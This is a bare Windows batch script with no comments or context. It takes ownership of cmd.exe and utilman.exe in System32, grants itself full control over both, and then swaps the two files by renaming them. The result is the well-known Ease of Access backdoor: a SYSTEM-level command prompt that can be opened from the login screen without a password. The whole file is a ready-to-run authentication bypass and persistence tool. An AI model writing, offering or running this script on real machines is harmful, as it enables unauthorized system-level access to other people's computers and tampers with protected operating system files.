@echo off
set "username=%username%"

echo Granting full access to cmd.exe for %username%
icacls C:\Windows\System32\cmd.exe /grant:r %username%:F
pause

echo Granting full access to utilman.exe for %username%
icacls C:\Windows\System32\utilman.exe /grant:r %username%:F
pause

echo Taking ownership of cmd.exe
takeown /f C:\Windows\System32\cmd.exe
pause

echo Taking ownership of utilman.exe
takeown /f C:\Windows\System32\utilman.exe
pause

echo Renaming cmd.exe to utilman2.exe
ren C:\Windows\System32\cmd.exe utilman2.exe
pause

echo Renaming utilman.exe to cmd.exe
ren C:\Windows\System32\utilman.exe cmd.exe
pause

echo Renaming utilman2.exe back to utilman.exe
ren C:\Windows\System32\utilman2.exe utilman.exe
pause
